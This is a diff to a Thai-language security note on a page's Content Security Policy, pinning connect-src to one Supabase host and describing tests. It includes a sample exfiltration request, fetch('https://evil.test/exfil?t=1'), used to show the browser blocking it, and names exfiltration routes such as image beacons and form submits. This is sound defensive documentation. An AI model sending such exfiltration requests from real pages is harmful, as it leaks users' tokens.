@@ -18,7 +18,7 @@ CSP **ไม่ได้** กันการอ่าน — โค้ดที
 
 | directive | ผล |
 |---|---|
-| `connect-src 'self' https://*.supabase.co` | `fetch`/XHR/WebSocket ไป host อื่นถูกบล็อก |
+| `connect-src 'self' https://<supabase-host>` | `fetch`/XHR/WebSocket ไป host อื่นถูกบล็อก |
 | `img-src 'self' data: blob:` | ปิดการ exfiltrate ผ่าน image beacon |
 | `form-action 'none'` | ปิดการส่งออกผ่าน form submit |
 | `object-src 'none'` / `base-uri 'none'` | ปิด plugin และการย้ายฐาน URL ของหน้า |
@@ -45,17 +45,44 @@ CSP **ไม่ได้** กันการอ่าน — โค้ดที
 
 `pwsCspAllowsConnect()` รับ wildcard host แบบ `https://*.example.com` โดยแมตช์เฉพาะ
 subdomain จริงเท่านั้น (`https://example.com` และ `https://evil-example.com` ไม่ผ่าน)
+แต่ **นโยบายที่ส่งขึ้นจริงห้ามใช้ wildcard** — `https://*.supabase.co` จะเปิดให้
+bundle ส่ง access token ไป project อื่นของ Supabase ได้ ซึ่งเป็นปลายทางกลุ่มเดียวกับ
+ที่เอกสารนี้อ้างว่าปิดไปแล้ว · `connect-src` จึงปักหมุด host ของ deployment ตรง ๆ
+และ `harness.js` เปลี่ยนเป็น host ของเทสต์ให้เอง เหมือนที่ทำกับ `SB_URL`
 
 ## การพิสูจน์
 
-`node harness.js` — 55 เทสต์ ในนั้นมี 5 เทสต์สำหรับเรื่องนี้: CSP ยังมีความหมาย
+`node harness.js` — 56 เทสต์ ในนั้นมี 6 เทสต์สำหรับเรื่องนี้: CSP ยังมีความหมาย
 (ไม่มี `unsafe-eval`/wildcard), connect-src ยอมเฉพาะที่ประกาศ, wildcard แมตช์
-เฉพาะ subdomain, ไม่มี CSP = ปฏิเสธไว้ก่อน, และ origin นอก CSP ต้องไม่ mount
-และไม่ยิง request
+เฉพาะ subdomain, นโยบายจริงต้องปักหมุด Supabase host ไม่ใช่ wildcard,
+ไม่มี CSP = ปฏิเสธไว้ก่อน, และ origin นอก CSP ต้องไม่ mount และไม่ยิง request
 
 `harness.js` ยังตรวจ CSP ของ `index.html` ก่อนดัดแปลงเพื่อเทสต์ด้วย — ถ้ามีใครใส่
 `unsafe-eval` หรือ wildcard หรือลบ `object-src`/`base-uri`/`connect-src` ออก
 harness จะหยุดทันทีพร้อมบอกเหตุผล ไม่ปล่อยให้เทสต์ผ่านแบบไม่มีความหมาย
+
+### พิสูจน์บนเบราว์เซอร์จริง (ไม่ใช่แค่ meta อยู่ในไฟล์)
+
+เทสต์ทั้งหมดรันบน `file://` จึงพิสูจน์ได้แค่ว่า "ตัวแยกวิเคราะห์อ่านนโยบายถูก"
+ไม่ได้พิสูจน์ว่าเบราว์เซอร์ *บังคับใช้* จึงเสิร์ฟสำเนาหน้าผ่าน HTTP บน localhost
+แล้วยิง `fetch('https://evil.test/exfil?t=1')` ผลที่ได้ (2026-09-05):
+
+```
+{"evil":"REJECTED:TypeError","fonts":"LOADED","cdn":"LOADED"}
+Connecting to 'https://evil.test/exfil?t=1' violates the following
+Content Security Policy directive: "connect-src 'self' https://…"
+```
+
+คือถูกปฏิเสธด้วย CSP จริง ไม่ใช่ network error ที่บังเอิญหน้าตาเหมือนกัน
+และ Google Fonts กับ cdnjs ยังโหลดผ่านตามปกติ ไม่ได้ถูกบล็อกไปด้วย
+
+### ลำดับใน `<head>` มีผล
+
+meta CSP คุมเฉพาะทรัพยากรที่ parser เห็น *หลัง* จากมัน จึงต้องอยู่ต้น `<head>`
+ก่อน `<link rel="preconnect">` และ stylesheet ทั้งหมด · แต่ต้องอยู่ **หลัง**
+`<meta charset>` เสมอ เพราะ charset ต้องอยู่ใน 1024 ไบต์แรกของไฟล์ และคอมเมนต์
+ภาษาไทยเหนือ meta CSP ยาวพอที่จะดันมันเกินไปได้ (เคยดันไปถึงไบต์ที่ 1422 มาแล้ว
+ซึ่งทำให้ Chrome เดา encoding เองและภาษาไทยเพี้ยนทั้งหน้า)
 
 หมายเหตุสำหรับคนรัน harness: หน้าเทสต์เปิดผ่าน `file://` ซึ่ง `'self'` ไม่แมตช์ไฟล์
 ข้างเคียง harness จึง **inline** ชุดเทสต์เข้าไปในหน้าแทนการใช้ `<script src>`
